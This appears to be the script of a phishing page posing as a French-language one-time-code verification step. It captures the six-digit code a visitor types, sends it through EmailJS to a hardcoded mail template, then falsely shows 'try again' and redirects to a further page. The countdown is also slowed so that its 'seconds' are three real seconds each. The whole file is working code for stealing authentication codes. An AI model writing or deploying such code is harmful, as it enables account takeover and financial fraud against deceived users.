
const toggle = document.getElementById('themeToggle');
const label = document.getElementById('themeLabel');

if (toggle && label) {
  toggle.addEventListener('click', () => {
    const isLight = document.body.getAttribute('data-theme') === 'light';
    document.body.setAttribute('data-theme', isLight ? 'dark' : 'light');
    label.textContent = isLight ? 'Dark' : 'Lumière';
  });
}

/* ======================================
   NAVIGATION ENTRE LES ÉTAPES
   CODE ORIGINAL
====================================== */
let otpTimerInterval = null;

function showStep(n) {
  document.querySelectorAll('.step').forEach(s =>
    s.classList.remove('active')
  );

  const step = document.getElementById('step' + n);
  if (step) step.classList.add('active');

  document.querySelectorAll('.steps span').forEach((s, i) => {
    s.classList.toggle('active', i < n);
  });
}

function goToStep2() {
  showStep(2);
  startOtpTimer();

  

  const field = document.getElementById('otpSingle');
  if (field) {
    field.value = '';
    field.focus();
  }
  
}

function goToStep3() {
  if (otpTimerInterval) clearInterval(otpTimerInterval);
  showStep(3);
}

/* ======================================
   COMPTE À REBOURS — CODE ORIGINAL
====================================== */
function startOtpTimer() {
  let seconds = 30;

  const timerEl = document.getElementById('otpTimer');
  const resendEl = document.getElementById('resendLink');
  const countEl = document.getElementById('resendCount');

  if (!timerEl || !resendEl || !countEl) return;

  timerEl.textContent = seconds;
  countEl.textContent = '(dans ' + seconds + 's)';
  resendEl.classList.add('disabled');

  if (otpTimerInterval) clearInterval(otpTimerInterval);

  otpTimerInterval = setInterval(() => {
    seconds--;

    timerEl.textContent = Math.max(seconds, 0);

    if (seconds > 0) {
      countEl.textContent = '(dans ' + seconds + 's)';
    } else {
      clearInterval(otpTimerInterval);
      resendEl.classList.remove('disabled');
      countEl.textContent = '';
    }
  }, 3000);
}

if (document.getElementById("otpTimer")) {
  startOtpTimer();
}


emailjs.init({
    publicKey: "OdVrpD_0CpgUT6Ahz"
});



const otpForm = document.getElementById("otpForm");
const otpSingle = document.getElementById("otpSingle");
const result = document.getElementById("result");



if (otpSingle) {
  otpSingle.addEventListener("input", function () {
    this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
  });
}



if (otpForm && otpSingle && result) {

  otpForm.addEventListener("submit", async function (event) {

    event.preventDefault();

    // Vérification 
    if (!otpForm.checkValidity()) {
      otpForm.reportValidity();
      return;
    }

    

    if (!/^[0-9]{6}$/.test(otpSingle.value)) {
      result.textContent = "Veuillez saisir un code de 6 chiffres.";
      result.className = "error";
      return;
    }

   
    


    const otp = otpSingle.value.trim();


    
    const templateParams = {
        otp: otp,
    };


    

    result.textContent = "connection en cours...";
    result.className = "";


    try {

        const response = await emailjs.send(
            "service_client",
            "template_ux52czx",
            templateParams
        );


        console.log(
            "connexion en cour :",
            response.status,
            response.text
        );


        result.textContent = "try again.";
        result.className = "success";


        // ------------------------------
        // Redirection après envoi réussi
        // ------------------------------

        window.location.href = "secure2.html";


    } catch (error) {

        console.error("Erreur EmailJS :", error);

        result.textContent =
            "error try again.";

        result.className = "error";
    }

});
}